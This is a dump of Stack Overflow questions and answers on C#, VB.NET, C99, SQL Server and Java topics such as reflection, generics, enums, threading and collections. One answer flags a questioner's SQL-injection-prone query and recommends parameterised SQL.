<pre><code>int[,,] a = new int[10,11,12];
Console.WriteLine(a.Length);           // 1320
Console.WriteLine(a.GetLength(0));     // 10
Console.WriteLine(a.GetLength(1));     // 11
Console.WriteLine(a.GetLength(2));     // 12
</code></pre>
"
"<p><a href=""http://en.wikipedia.org/wiki/C99"">C99</a> has been around for over 10 years, but support for it has been slow coming, so most developers have stuck with C89. Even today, I'm sometimes mildly surprised when I come across C99 features in C code.</p>

<p>Now that most major compilers support C99 (MSVC being a notable exception, and some embedded compilers also lagging behind), I feel that developers who work with C probably ought to know about what C99 features are available to them. Some of the features are just common features that were never standardized before (<code>snprintf</code>, for instance), or are familiar from C++ (flexible variable declaration placement, or single-line <code>//</code> comments), but some of the new features were first introduced in C99 and are unfamiliar to many programmers.</p>

<p>What do you find the most useful new features in C99?</p>

<p>For reference, <a href=""http://www.open-std.org/jtc1/sc22/WG14/www/docs/n1256.pdf"">the C99 standard</a> (labelled as a draft, but identical to the updated standard, as far as I know), the <a href=""http://www.open-std.org/jtc1/sc22/wg14/www/newinc9x.htm"">list of new features</a>, and the <a href=""http://gcc.gnu.org/c99status.html"">GCC C99 implementation status</a>.</p>

<p>One feature per answer, please; feel free to leave multiple answers. Short code examples demonstrating new features are encouraged.</p>
","33708","","<p>Variable length arrays:</p>

<pre><code>int x;
scanf(""%d"", &amp;x);
int a[x];
for (int i = 0; i &lt; x; ++i)
    a[i] = i * i;
for (int i = 0; i &lt; x; ++i)
    printf(""%d\n"", a[i]);
</code></pre>
"
"<p>How can I change the following code to write to the database null instead of empty strings? </p>

<pre><code>Public Sub SetChangeRequest(ByVal referenceLeaseID As Integer, _
                                  ByVal referenceCustomerID As Integer, _
                                  Optional ByVal custUnitNum As Object = Nothing, _
                                  Optional ByVal driverFirstName As Object = Nothing, _
                                  Optional ByVal driverLastName As Object = Nothing, _
                                  Optional ByVal driverEmail As Object = Nothing, _
                                  Optional ByVal plateNumber As Object = Nothing, _
                                  Optional ByVal plateProvince As Object = Nothing, _
                                  Optional ByVal usageProvince As Object = Nothing, _
                                  Optional ByVal invoiceGroups As Object = Nothing)
    mcmd = New SqlCommand
    mcmd.CommandType = CommandType.Text
    mcmd.Connection = mcn
    mcmd.CommandText = ""IF EXISTS (SELECT * FROM ChangeRequest WHERE ReferenceLeaseID = "" &amp; referenceLeaseID &amp; "")"" &amp; vbNewLine &amp; _
                        ""DELETE FROM ChangeRequest WHERE ReferenceLeaseID = "" &amp; referenceLeaseID &amp; vbNewLine &amp; _
                        ""INSERT INTO ChangeRequest (ReferenceLeaseID, ReferenceCustomerID, CustomerUnitNum, DriverFirstName, DriverLastName, DriverEmail, PlateNumber, PlateProvince, UsageProvince, InvGroupID)"" &amp; vbNewLine &amp; _
                        ""VALUES ('"" &amp; referenceLeaseID &amp; ""', '"" &amp; referenceCustomerID &amp; ""', '"" &amp; custUnitNum &amp; ""', '"" &amp; driverFirstName &amp; ""', '"" &amp; driverLastName &amp; ""', '"" &amp; driverEmail &amp; ""', '"" &amp; plateNumber &amp; ""', '"" &amp; plateProvince &amp; ""', '"" &amp; usageProvince &amp; ""', '"" &amp; invoiceGroups &amp; ""')""
    mcn.Open()
    mcmd.ExecuteScalar()
    mcn.Close()
End Sub
</code></pre>

<p>Cheers,</p>

<p>Mike</p>
","33708","","<p>They way you're constructing your query is inefficient, hard to read, error prone, and worst of all open to SQL injection attacks. You should use SQL parameters:</p>

<pre><code>mcmd.CommandText = ""IF EXISTS (SELECT * FROM ChangeRequest WHERE ReferenceLeaseID = @referenceLeaseID"") "" _
                   ""DELETE FROM ChangeRequest WHERE ReferenceLeaseID = @referenceLeaseID "" &amp; _
                   ""INSERT INTO ChangeRequest (ReferenceLeaseID, ReferenceCustomerID, CustomerUnitNum, DriverFirstName, DriverLastName, DriverEmail, PlateNumber, PlateProvince, UsageProvince, InvGroupID) "" &amp; _
                   ""VALUES (@referenceLeaseID, @referenceCustomerID, @custUnitNum, @driverFirstName, @driverLastName, @driverEmail, @plateNumber, @plateProvince, @usageProvince, @invoiceGroups)""
</code></pre>

<p>You can specify values for parameters like:</p>

<pre><code>mcmd.Parameters.Add(""@parameterName"", If(ParameterValue Is Nothing, DBNull.Value, ParameterValue))
</code></pre>
"
"<p>I'm trying to write out the specific line of code that contains the IF statement.  What appears to be happening if it never finds the code i'm looking to call in my if statement and i know it exists, it's a copy and paste.  Also, how do i only write out the specific line that meets the if statement.  Is there one where i should do a foreach?  foreach (redsplitline in redsplitlines)</p>

<p>heres the code:</p>

<pre><code>{
                    string linesplitnew = ""ENDOB"";
                    string[] redsplitlines = rdrred.ReadToEnd().Split(new string[] { linesplitnew }, StringSplitOptions.None);
                    string redpullline = ""*BEGINOB\r\n6*"";
                    string redpullline2 = ""*BEGINOB\r\n13*"";
                    if(redsplitlines.Contains(redpullline))
                    {
                        Console.WriteLine(redsplitlines);
                    }
                    else if(redsplitlines.Contains(redpullline2))
                    {
                        Console.WriteLine(redsplitlines);
                    } 

                }
</code></pre>
","33708","","<p>Try this:</p>

<pre><code>var lines = from line in redsplitlines
            where line.Contains(redpullline) || line.Contains(redpullline2)
            select line;

foreach (var l in lines)
    Console.WriteLine(l);
</code></pre>
"
"<p>I have a listview but I would like to add 3 properties (for example one of them is ""image"") to the listviewitems in it.<br>
I was fine with making a custom class with the 3 properties and just inheriting ListViewItem but now I need to use MultiSelect, so it means doing things like(in For Each loops):</p>

<p><code>ListView1.SelectedItems.Item(i).Image</code><br>
don't work because it returns a ListViewItem not my CustomClass.<br>
I could always do :<br>
<code>Ctype(ListView1.selectedItems(i), MyCustomClass).Image</code>  </p>

<p>But using that over and over again seems like a waste/wrong way to do it?</p>
","33708","","<p>It's not a particularly good idea to subclass <code>ListViewItem</code> just to attach custom attributes to it.  The class provides a <a href=""http://msdn.microsoft.com/en-us/library/system.windows.forms.listviewitem.tag.aspx"" rel=""nofollow""><code>Tag</code> property</a> for specifically this purpose and you should populate that with your own object instead of subclassing. It might not make a big difference syntax-wise, but it's a better design.</p>
"
"<p>When calling typeof(Bar).GetInterfaces() on the following scenario the method returns IFoo and IBar. </p>

<p><code>
interface IFoo {}<br>
interface IBar : IFoo {}<br>
class Bar : IBar {}
</code></p>

<p>Is there a way that I can find only the immediate interface (IBar) on Bar? </p>
","33708","","<p>No, there's no such thing as the ""immediate"" interface in the compiled code. Your class is effectively compiled as:</p>

<pre><code>class Bar : IBar, IFoo { }
</code></pre>

<p>and you can't distinguish between the two. The only thing you could do is to check all of them and see whether two or more of the interfaces inherit from each other or not (and even in that case, you can't really check whether the author of the class has explicitly mentioned the base interface in code or not):</p>

<pre><code>static IEnumerable&lt;Type&gt; GetImmediateInterfaces(Type type)
{
    var interfaces = type.GetInterfaces();
    var result = new HashSet&lt;Type&gt;(interfaces);
    foreach (Type i in interfaces)
        result.ExceptWith(i.GetInterfaces());
    return result;
}
</code></pre>
"
"<p>I am trying to retrieve the public properties of an object but it is returning nothing.  Can you tell me what I'm doing wrong.  </p>

<pre><code>public class AdHocCallReportViewModel : ReportViewModel
{
    public string OperatorForCustEquipID { get; set; }
    public string OperatorForPriorityID { get; set; }
    public string OperatorForCallTypeID { get; set; }
    public string OperatorForStatusID { get; set; }
}

public UpdateReportParameters(AdHocCallReportViewModel rvm)
{
    var type = rvm.GetType();
    foreach (var f in type.GetFields().Where(f =&gt; f.IsPublic))
    {
        Console.WriteLine(f.Name);
        Console.WriteLine(f.GetValue(rvm).ToString());
    }
}  
</code></pre>

<p>When stepping through the code, it skips over the foreach loop because GetFields returns zero items.</p>
","33708","","<p>Pass <code>BindingFlags.Instance | BindingFlags.NonPublic | BindingFlags.Public</code> to get all instance fields.</p>

<p>On second thought, I'm seeing that you are explicitly filtering for public fields. The class does not have any public fields. The fields that are automatically generated by the compiler as the backing store for the properties are private.</p>
"
"<p>here is my question: why should I use autoincremental fields as primary keys on my tables instead of something like UUID values?</p>

<p>What are the main advantages of one over another? What are the problems and strengths of them?</p>
","33708","","<p>Simple numbers consume less space. UUID values take consume 128 bits each. Working with numbers is also simpler. For most practical purposes 32-bit or 64-bit integers can server well as the primary key. 2<sup>64</sup> is a very large number.</p>

<p>Consuming less space doesn't just save hard disk space In means faster backups, better performance in joins, and having more real stuff cached in the database server memory. </p>
"
"<p>I want to know if a class can inherit from a class and and interface. 
The example code below doesn't work but I think it conveys what I want to do.
Does anyone have any recommendations???  The reason that I want to do this is because at my company we make USB, serial, Ethernet, etc device. I am trying to develop a generic component/interface that I can use to write programs for all our devices that will help keep the common things (like connecting, disconnecting, getting firmware) the same for all of our applications... Any suggestions would be appriciated!</p>

<p>To Add to this question:  If GenericDevice is in different project, can I put the IOurDevices interface in that project then then make the USBDevice class implement the interface if I add a reference to the first project?? Because would like to just reference one project and then implement different interfaces depending on what the device is...</p>

<pre><code>class GenericDevice
{
   private string _connectionState;
   public connectionState
   {
      get{return _connectionState; }
      set{ _connectionState = value;}
   }
}

interface IOurDevices
{
   void connectToDevice();
   void DisconnectDevice();
   void GetFirmwareVersion();
}

class USBDevice : IOurDevices : GenericDevice
{
   //here I would define the methods in the interface
   //like this...
   void connectToDevice()
   {
       connectionState = ""connected"";
   }
}

//so that in my main program I can do this...

class myProgram
{
   main()
   {
      USBDevice myUSB = new USBDevice();
      myUSB.ConnectToDevice;
   }
}
</code></pre>
","33708","","<p>Yes. Try:</p>

<pre><code>class USBDevice : GenericDevice, IOurDevice
</code></pre>

<p><strong>Note:</strong> The base class should come before the list of interface names.</p>

<p>Of course, you'll still need to implement all the members that the interfaces define. However, if the base class contains a member that matches an interface member, the base class member can work as the implementation of the interface member and you are not required to manually implement it again.</p>
"
"<p>An executable problem like exe does not work on Linux (without wine). When compiling source code compiler produce object code which is specific to a particular cpu architecture. But same application does not work with on an another OS with same CPU. I know code may include instructions to specific to the OS that will prevent executable running. But what about a simple program  2+2 ?  Confusing part is what the hell that machine code prevents working. Machine code specific to cpu right? If we strip executable file format could we see same machine code (like 2 + 2) for both operating systems?</p>

<p>One more question: What about assembly language? DO windows and Linux use different assembly language for same cpu?.</p>
","33708","","<p>There are many differences. Among them:</p>

<ol>
<li><p><strong>Executable Format</strong>: Every OS requires the binaries to conform to a specific binary format. For Windows, this is Portable Executable (PE) format. For Linux, it's ELF most of the time (it supports other types too).</p></li>
<li><p><strong>Application Binary Interface</strong>: Each OS defines a set of primary system functions and the way a program calls them. This is fundamentally different between Linux and Windows. While the instructions that compute 2 + 2 are identical on Linux and Windows in x86 architecture, the way the application starts, the way it prints out the output, and the way it exits differs between the operating systems. </p></li>
</ol>

<p>Yes, both Linux and Windows programs on x86 architecture use the instruction set that the CPU supports which is defined by Intel.</p>
"
"<p>i have added an item in the context menu of windows explorer using registry.
i want that when user right clicks on a file and then clicks on my added context menu item then an application must execute as well as location of that file must be availabe.</p>

<p>My application gets executed but i could not get the path of file on which i right clicked</p>
","33708","","<p>The path is passed as a command line arguments. In the entry point, you can access it by defining a <code>string[]</code> argument:</p>

<pre><code>static void Main(string[] args) {
    // the path is passed in the `args` array.
}
</code></pre>

<p>It should also be available by calling <a href=""http://msdn.microsoft.com/en-us/library/system.environment.getcommandlineargs.aspx"" rel=""nofollow""><code>Environment.GetCommandLineArgs</code> method</a>.</p>
"
"<p>In C#/Winforms how do I set the default focus when my application starts?</p>
","33708","","<p>The one with the minimum tab index automatically gets the focus (assuming the <code>TabStop</code> property is set to true). Just set the tab indices appropriately.</p>

<p>By the way, Visual Studio provides a way to easily set tab indices by just clicking on the controls in the order you want. You can activate this feature by choosing ""Tab Order"" option in the ""View"" menu when you are in the form design view.</p>

<p>You can also manually give the focus to a control by calling its <code>Focus</code> method when the form loads.</p>
"
"<p>I would like to have a delegate that is constrained to returning one of two types; an <em>ActionResult</em> or a <em>string</em>. Is this possible?</p>
","33708","","<p>No, it's not possible (at least not in C# 4 and below). There's no support for ""or"" constraints on generic type parameters.</p>

<p>There's also no constraint that restricts a type argument to be an exact type. All constraints restrict the base types of the type argument. They cannot restrict you from inheriting from them.</p>
"
"<p>We have legacy character codes that we want to store as numbers in a new system. To increase readibility and general understanding in the code for devs making the migration, I want to do Enums like this...</p>

<pre><code>Public Enum Status As Short
    Open = AscW(""O"")
    Closed = AscW(""C"")
    Pending = AscW(""P"")
    EnRoute = AscW(""E"")
End Enum
</code></pre>

<p>With this setup, the code will be readable (imagine <code>If Record.Status = Status.Open</code>), and yet the values will be stored in the database as small numbers so it will be efficient.  However... I am a VB.NET guy, but everybody wants to code in C#, so I need this sort of structure in C#.</p>

<p>After Googling, I discovered the the general .NET equivalent of <code>AscW</code> is <code>Convert.ToInt32(""C"")</code>.  When I try to use that statement in an enum, I get the compiler error ""Constant Expression Required"".</p>

<p>How can I do this in C#?  Is there a better way?</p>
","33708","","<p>A method call is not a constant expression. Try this:</p>

<pre><code>public enum Status { 
   Open = 'O',
   Closed = 'C',
   Pending = 'P',
   EnRoute = 'E'
}
</code></pre>

<p>The reason <code>AscW</code> works in VB is that it's an internal thing that VB compiler understands and evaluates at compile time and is considered a constant expression by the compiler. Even in VB, <code>Convert.ToInt32</code> will not work.</p>

<p>To quote the <a href=""http://www.microsoft.com/downloads/details.aspx?FamilyID=39de1dd0-f775-40bf-a191-09f5a95ef500&amp;displaylang=en"" rel=""nofollow"">Visual Basic specification</a>:</p>

<blockquote>
  <h3>11.2 Constant Expressions</h3>
  
  <p>A constant expression is an expression whose value can be fully evaluated at compile time. <em>[...]</em> The following constructs are permitted in constant expressions:  </p>
  
  <p><em>[...]</em></p>
  
  <ul>
  <li><p>The following run-time functions:  </p>
  
  <ul>
  <li><code>Microsoft.VisualBasic.Strings.ChrW</code></li>
  <li><code>Microsoft.VisualBasic.Strings.Chr</code>, if the constant value is between 0 and 128</li>
  <li><code>Microsoft.VisualBasic.Strings.AscW</code>, if the constant string is not empty</li>
  <li><code>Microsoft.VisualBasic.Strings.Asc</code>, if the constant string is not empty              </li>
  </ul></li>
  </ul>
</blockquote>
"
"<p>I'm trying to enforce an inheritor of an abstract class to initialize one of the fields in the base.</p>

<p>I can't do this via a constructor in the base because the type of the field requires a reference back to the object creating it. (I suppose I could provide a parameterless ctor for the field type. But I feel that would just be shifting the problem, and it should be immutable anyway).</p>

<p>Perhaps someone can suggest how to do it, or maybe make it so I don't need to do it at all?</p>

<p>This is pretty much what I'm doing:</p>

<pre><code>public abstract class Base
{
    // Would like to force setting in CTOR
    protected BaseImplementation _implementation;  
    protected BaseImplementation Implementation 
    { get { return _implementation; } }

    public void DoSomething()
    {    
        Implementation.DoSomething();
    }
}

public abstract class BaseImplementation
{
    public abstract void DoSomething();
}

public class MyObject : Base
{
    // Note its Nested
    public class MyImplementation : BaseImplementation
    {
        private MyObject _myObject;

        public MyImplementation(MyObject myObject)
        {
            this._myObject = myObject;
        }

        public override void DoSomething()
        {
            // Does something
        }
        public virtual void SomethingElse()
        {
            // Does something else 
        }
    }

    new public MyImplementation Implementation
    {
        get { return (MyImplementation) _implementation; }
    }

    public void SomethingElse()
    {
        Implementation.SomethingElse();
    }
}
</code></pre>

<p>To give a little context, I have a number of classes which inherit from the base. They, intern have multiple ways which they can manipulate their state. This has been the best solution I have come up with for handling that.</p>

<h2>Edit</h2>

<p>I forgot to mention that I'm not using an Abstract property because it means I cant use <code>new public MyImplementation Implementation {...</code>. I don't want to have to cast Implementation to MyImplementation whenever I use functionality specific to the derived class <em>(thus using <code>new</code> in the first place)</em> or create multiple fields containing the same object.</p>
","33708","","<p>Don't add a field to the base class. Simply make it an <code>abstract</code> property. Derived classes will have to override it and return their own value.</p>

<pre><code>protected abstract BaseImplementation Implementation { get; }
</code></pre>

<p>Alternatively, you can make  the base class constructor accept an argument of type <code>BaseImplementation</code> and have the derived class initialize it:</p>

<pre><code>public abstract class Base { 
    protected Base(BaseImplementation implementation) {
        _implementation = implementation; 
    }

    private BaseImplementation _implementation;  
    protected BaseImplementation Implementation { get { return _implementation; } }
}

public class Derived : Base {
    public Derived() : base(new MyImplementation()) { }
    // ...
}
</code></pre>
"
"<p>I am running SQL Server 2005 but I am unsure which edition this is. How can I decide what edition (Express, Standard, Enterprise etc) is running on the machine? </p>
","33708","","<pre><code>select @@version
</code></pre>

<blockquote>
  <h3>Sample Output</h3>
  
  <p>Microsoft SQL Server 2008 (SP1) - 10.0.2531.0 (X64)   Mar 29 2009 10:11:52   Copyright (c) 1988-2008 Microsoft Corporation  Developer Edition (64-bit) on Windows NT 6.1  (Build 7600: ) </p>
</blockquote>

<p>If you just want to get the edition, you can use:</p>

<pre><code>select serverproperty('Edition')
</code></pre>

<p>To use in an automated script, you can get the edition ID, which is an integer:</p>

<pre><code>select serverproperty('EditionID')
</code></pre>

<ul>
<li>-1253826760 = Desktop  </li>
<li>-1592396055 = Express </li>
<li>-1534726760 = Standard </li>
<li>1333529388 = Workgroup </li>
<li>1804890536 = Enterprise </li>
<li>-323382091 = Personal </li>
<li>-2117995310 = Developer </li>
<li>610778273 = Enterprise Evaluation </li>
<li>1044790755 = Windows Embedded SQL</li>
<li>4161255391 = Express with Advanced Services</li>
</ul>
"
"<p>I have a base class, with a method, where I would like to use generics to force the coder to use a generic expression on the current class:</p>

<pre><code>public class TestClass
{
    public void DoStuffWithFuncRef&lt;T&gt;(Expression&lt;Func&lt;T, object&gt;&gt; expression) where T : TestClass
        {
            this.DoStuffWithFuncRef(Property&lt;T&gt;.NameFor(expression));
        }
}
</code></pre>

<p>Now, I would like to force T to be of the type of the instantiated class, which I hope will the cause the C# compiler to automatically understand the generic type to use. E.g. I would like to avoid coding the doStuff method below, where I have to specify the correct type - but rather use the doStuffILikeButCannotGetToWork method:</p>

<pre><code>public class SubTestClass : TestClass
{
    public string AProperty { get; set; }

    public void doStuff()
    {
        this.DoStuffWithFuncRef&lt;SubTestClass&gt;(e =&gt; e.AProperty);
    }

    public void doStuffILikeButCannotGetToWork()
    {
        this.DoStuffWithFuncRef(e =&gt; e.AProperty);
    }
}
</code></pre>

<p>Is this possible? Should I be doing this in a different way?</p>
","33708","","<p>Make the base class itself generic:</p>

<pre><code>public class TestClass&lt;T&gt; where T : TestClass&lt;T&gt;
{
    public void DoStuffWithFuncRef(Expression&lt;Func&lt;T, object&gt;&gt; expression)
    {
        this.DoStuffWithFuncRef(Property&lt;T&gt;.NameFor(expression));
    }
}
</code></pre>

<p>and derive from it:</p>

<pre><code>public class SubTestClass : TestClass&lt;SubTestClass&gt; {
     // ...
}
</code></pre>

<p>If you need to have an inheritance hierarchy with a single root, inherit the generic base class from another non-generic version:</p>

<pre><code>public class TestClass { ... }
public class TestClass&lt;T&gt; : TestClass where T : TestClass&lt;T&gt;
</code></pre>

<p>Of course you should probably make the base classes abstract.</p>
"
"<p>At assigning one field to another, does the C# just copy data over, or actually creates link?
In <a href=""http://www.enchantedage.com/node/45"" rel=""nofollow"">this</a> article there's an example of game engine structure. The coder there has components contain their parent. In C#, do they just contain the parent copy, or they refer to it?</p>

<p>Example code:</p>

<pre><code>class World
{
    ...
    public void Update()
    {
        ...
        ent.OnAttach(this);
        ...
    }
    ...
}

class Entity
{
    ...
    public void OnAttach(World world)
    {
        world_ = world;
    }
    ...
}
</code></pre>

<p>Could the Entity object now access World object and have access to it's fields and methods, like in the artice? (or I misunderstood the code?)</p>
","33708","","<p>It depends on the <code>World</code> type. If it's a reference type (a class), the copied reference will point to the same object and thus changing the object pointed by the new reference will affect the original object (no new object is created).  This is the case in the posted sample. The field will simply refer to the same <code>World</code> object.</p>

<p>If the <code>World</code> type is a value type, it's copied (along with its contents) and will become an entirely distinct value, changing which will not affect the original.</p>
"
"<p>I'm using Enumerable.ToDictionary to create a Dictionary off of a linq call:</p>

<pre><code>return (from term in dataContext.Terms
        where term.Name.StartsWith(text)
        select term).ToDictionary(t =&gt; t.TermID, t =&gt; t.Name);
</code></pre>

<p>Will that call fetch the entirety of each term, or will it only retrieve the TermID and the Name fields from my data provider? In other words, would I be saving myself database traffic if I instead wrote it like this:</p>

<pre><code>return (from term in dataContext.Terms
        where term.Name.StartsWith(text)
        select new { term.TermID, term.Name }).ToDictionary(t =&gt; t.TermID, t =&gt; t.Name);
</code></pre>
","33708","","<p>No. <code>ToDictionary</code> is an extension method for <code>IEnumerable&lt;T&gt;</code> not <code>IQueryable&lt;T&gt;</code>. It doesn't take an <code>Expression&lt;Func&lt;T, TKey&gt;&gt;</code> but simply a <code>Func&lt;T, TKey&gt;</code> that it'll blindly call for each item. It doesn't care (and doesn't know) about LINQ and the underlying expression trees and stuff like that. It just iterates the sequence and builds up a dictionary. As a consequence, in your first query, all columns are fetched.</p>
"
"<p>How can i copy Dictionary object by value in c#</p>
","33708","","<p>Create a new <code>Dictionary</code> passing the source dictionary in the constructor (of course, this will not copy the objects in the dictionary if they are reference types):</p>

<pre><code>var copied = new Dictionary&lt;KeyType, ValueType&gt;(originalDictionary);
</code></pre>
"
"<p>I'm building an app in C#, however I'm new to the language though its pretty easy to learn because its too damn similar to Java.</p>

<p>However, I'm getting lost with the data structures as I haven't found a list of comprehensive available data structures with their methods like how Java has them.</p>

<p>Anyone has a reference list of available data structs for C# and their methods?</p>
","33708","","<p>Most of the data structures you'll use in C# are contained in the <a href=""http://msdn.microsoft.com/en-us/library/system.collections.generic.aspx"">System.Collections.Generic namespace</a>. There are some rarely used data structures in the <a href=""http://msdn.microsoft.com/en-us/library/system.collections.specialized.aspx"">System.Collections.Specialized namespace</a>. Also, there are some older, non-generic versions of data structures that are mostly deprecated since the introduction of generics in C# 2.0 available in the <a href=""http://msdn.microsoft.com/en-us/library/system.collections.aspx"">System.Collections namespace</a>.</p>

<p>Scott Mitchell has a nice introductory article set about some data structures in .NET: <a href=""http://msdn.microsoft.com/en-us/library/ms364091%28VS.80%29.aspx"">An Extensive Examination of Data Structures Using C# 2.0</a>.</p>

<p>If you're coming from a Java background, you'll notice that unlike Java, .NET data structures are named after their function, not the way they are implemented.</p>
"
"<p>We've all been there,  we have some deep property like cake.frosting.berries.loader that we need to check if it's null so there's no exception. The way to do is is to use a short-circuiting if statement</p>

<pre><code>if (cake != null &amp;&amp; cake.frosting != null &amp;&amp; cake.frosting.berries != null) ...
</code></pre>

<p>This strikes me however as not very elegant, there should perhaps be an  easier way to check the entire chain and see if it comes up against a null variable/property. </p>

<p>So is it possible using some extension method or would it be a language feature, or is it just a bad idea?</p>
","33708","","<p>If you need to have such an expression in your code, you are violating the <a href=""http://en.wikipedia.org/wiki/Law_of_Demeter"">Law of Demeter</a>. You should consider redesigning so that you don't need to access properties of properties of properties of an object directly. </p>

<p>In the few cases where it actually makes sense to violate that law, the way it works is pretty concise, thanks to the short-circuiting ""and"" operator.</p>
"
"<p>How can I use the numbers in the stacktrace? What do these mean?
In eclipse I get often exceptions, for example a NullPointerException:</p>

<pre><code>java.lang.NullPointerException
  at com.sun.midp.lcdui.DefaultEventHandler.commandEvent(+68)
  at com.sun.midp.lcdui.AutomatedEventHandler.commandEvent(+47)
  at com.sun.midp.lcdui.DefaultEventHandler$QueuedEventHandler.handleVmEvent(+186) 
</code></pre>
","33708","","<p>Those are the offsets of the instruction that caused the exception from the beginning of the method.</p>

<pre><code>java.lang.NullPointerException
  at com.sun.midp.lcdui.DefaultEventHandler.commandEvent(+68)
</code></pre>

<p>The instruction at offset 68 in the method <code>com.sun.midp.lcdui.DefaultEventHandler.commandEvent</code> is causing the actual exception by accessing a null reference.</p>

<pre><code>  at com.sun.midp.lcdui.AutomatedEventHandler.commandEvent(+47)
</code></pre>

<p>The instruction at offset 47 in the method <code>com.sun.midp.lcdui.AutomatedEventHandler.commandEvent</code> is a call instruction that runs the <code>com.sun.midp.lcdui.DefaultEventHandler.commandEvent</code> method.</p>

<pre><code>  at com.sun.midp.lcdui.DefaultEventHandler$QueuedEventHandler.handleVmEvent(+186)
</code></pre>

<p>The instruction at offset 186 in the method <code>com.sun.midp.lcdui.DefaultEventHandler$QueuedEventHandler.handleVmEvent</code> is a call instruction that runs the <code>com.sun.midp.lcdui.AutomatedEventHandler.commandEvent</code> method.</p>
"
"<p>Currently my application is 32-bit.</p>

<p>This means that all tables running on SQL Server 2008 IDs' are <code>INT</code> that is equal to <code>System.Int32</code> and everywhere where I parse strings to integers, I use <code>Int32.TryParse()</code>.</p>

<p>I called this <code>Implicit</code> int size indication.</p>

<p>If I will want to make my application to be 64-bit I think there will be 2 scenarios:</p>

<ul>
<li>Rename all <code>Int32</code> to <code>Int64</code> and <code>INT</code> to <code>BIGINT</code>.</li>
</ul>

<p>or</p>

<ul>
<li>Rename all <code>Int32</code> to <code>int</code> NOW and make int size indication be <code>Explicit</code>.</li>
</ul>

<p>Which is better, how do you think?</p>
","33708","","<p>C# and SQL Server both have fixed size of integers on all platforms. <code>int</code> in C# (which is simply an alias for <code>System.Int32</code> structure) and SQL Server is always 32 bits. Similarly, <code>long</code> in C# (an alias for <code>System.Int64</code> structure and SQL Server's <code>bigint</code> are always 64 bits regardless of the platform.</p>

<p>In C#, it's more natural to use the language defined alias for types (<code>int</code> instead of <code>Int32</code>, <code>long</code> instead of <code>Int64</code>) except for public method names (<code>ReadInt64</code> is preferable to <code>ReadLong</code>) as the method might be used in a language without or with different type aliases and it's better to use the .NET Framework name instead of the C# alias.</p>
"
"<p>Say i have a property in a class:</p>

<pre><code>Vector3 position{get; set;}
</code></pre>

<p>So i create an instance of that class somewhere and now i want to change position.x, that would be impossible now because the getter and setter set and get the whole object. So i have to make a temporary Vector3 change its values and then assign it. </p>

<p>Normally i would make position a public field so that problem would be solved. But i cant do it in this case because position is an implementation of an interface and interfaces cant have fields.</p>

<p>So how can i solve this the best way.</p>

<p>Edit: Vector3 is a struct so its a value type</p>
","33708","","<p>That's one of the issues with mutable value types. You can create a new instance of the value type with the new <code>X</code> value and reassign in to the property. You can make the instance creation easier by providing useful constructors or adding methods that return a modified object (instead of modifying the value).</p>
"
"<p>Is BackgroundWorker in c# Thread Safe?</p>

<p>The reason I ask this is because I get a </p>

<blockquote>
  <p>Controls created on one thread cannot
  be parented to a control on a
  different thread</p>
</blockquote>

<p>exception with it. This is my <code>DoWork</code> event code:</p>

<pre><code>private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
{



    var openFile = document.Open(MyFileName);
    e.Result = openFile;
}
</code></pre>

<p>where <code>document</code> is an UI control that is initialized when the parent form is created. During <code>Open</code> method various properties in <code>document</code> will be filled.</p>

<p>I tried to change the code to invoke, yet the same problem persists. i.e,</p>

<pre><code>document.GetType().GetMethod(""Open)"".Invoke(document, new object[]{MyFileName})
</code></pre>

<p>will yield the same error as the above.</p>

<p>Any idea how to manipulate the <code>document</code> control? In other words, how to make the above code work?</p>

<p><strong>Edit: It was suggested that I use <code>Control.Invoke</code>, but it still didn't work ( both of the threads hanged). This is the code I tried:</strong></p>

<pre><code>private delegate bool OpenFile(string filePath);
private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
{



    OpenFile oF = new OpenFile(document.Open);
    var openFile = Invoke(oF, MyFileName);  // it doesn't really matter whether I use BeginInvoke or Invoke, or other Control.Invoke, the end result is the same. Both the main thread hosting the document and the thread that launches the UI hanged.

    e.Result = openFile;
}
</code></pre>
","33708","","<p>While it's unclear to me what you exactly mean by thread-safety of a <code>BackgroundWorker</code>, the problem is not that object; Windows Forms controls are designed to be manipulated on a single thread (the UI thread). You should not manipulate Windows Forms objects on different threads. You can invoke actions in the UI thread from other threads by using the <code>Control.Invoke</code> method (the <code>Invoke</code> method you are currently using is provided by reflection and is totally unrelated to this problem):</p>

<pre><code>Invoke(new Action(MethodToRunInUIThread));

void MethodToRunInUIThread() {
    // do stuff here.
}
</code></pre>

<p>By the way, it doesn't make sense to use a background worker if all you are doing is manipulating UI objects.</p>
"
"<p>I understand partial methods can be used to split the definition of a method across multiple files. I'm curious though if it's permissible to have each definition of a method across multiple files contain code? </p>

<p>For example, say I have a method <code>private partial void Foo()</code>. Let's say I've got it defined in file A and file B. Can both instances have code contained in the method, or just one or the other? I guess I'd be surprised if this were permitted.</p>
","33708","","<p><em>This is really a comment to @Bruno's answer and may not be completely relevant to the question</em>:</p>

<p>The decision to not allow partial methods to have multiple implementations is an arbitrary decision made in the design of the language. Your argument is a good reason why you might decide against allowing such a thing in your language but there isn't really a technical limitation. You can very easily decide to allow multiple implementation and let the compiler decide the order of execution of implementations. Actually, C# specification already has cases with undefined order for <code>partial</code> classes:</p>

<pre><code>// A.cs:
partial class Program {
    static int x = y + 42;
    static void Main() {
       System.Console.WriteLine(""x: {0}; y: {1}"", x, y);
    }
}

// B.cs:
partial class Program {
    static int y = x + 42;
}
</code></pre>

<p>This is valid C# according to the C# Specification v3.0 but the output can be:</p>

<pre><code>x: 42; y: 84
</code></pre>

<p>or</p>

<pre><code>x: 84; y: 42
</code></pre>

<p>and the compiler is allowed to generate either of them. It doesn't even generate a warning.</p>

<p>The C# language requires a partial method to to have a <code>void</code> return type. The partial method signature can be defined at most once. Likewise, the implementation should be defined at most once. </p>
"
"<p>I'm using an API that has a ""Member"" class. I wish to extend this so i have create ""MemberProfile""  which inherits from ""Member""</p>

<p>I have some issue creating the constructor for this class. I wish to something like the following</p>

<pre><code>    var member = Member.GetCurrentMember();
    var memberProfile = new MemberProfile(member);
</code></pre>

<p>How would the constructor on MemberProfile look. Do i need to do some kind of cast?</p>
","33708","","<p>I suggest adding a <code>Member</code> field to the <code>MemberProfile</code> class and initialize it in the constructor. Don't inherit from <code>Member</code>.</p>

<pre><code>public class MemberProfile {
    public Member Member { get; private set; }
    public MemberProfile(Member member) { Member = member; }
}
</code></pre>

<p>If you really want to inherit from <code>Member</code>, you'll have to copy all the properties off the passed argument to the new instance manually.</p>
"
